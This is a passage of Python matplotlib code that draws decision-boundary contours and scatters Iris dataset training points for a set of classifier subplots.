    Z = Z.reshape(xx.shape)
    plt.contourf(xx, yy, Z, cmap=colormap, alpha=0.3)

    # plot the training points
    plt.scatter(X[:, 0], X[:, 1], s=4.0, c=labels, cmap=colormap)
    plt.xlabel(iris.feature_names[features[0]])
    plt.ylabel(iris.feature_names[features[1]])
    plt.xlim(xx.min(), xx.max())
    plt.ylim(yy.min(), yy.max())
    plt.xticks(())
    plt.yticks(())
    plt.title(titles[i])

plt.show()
"
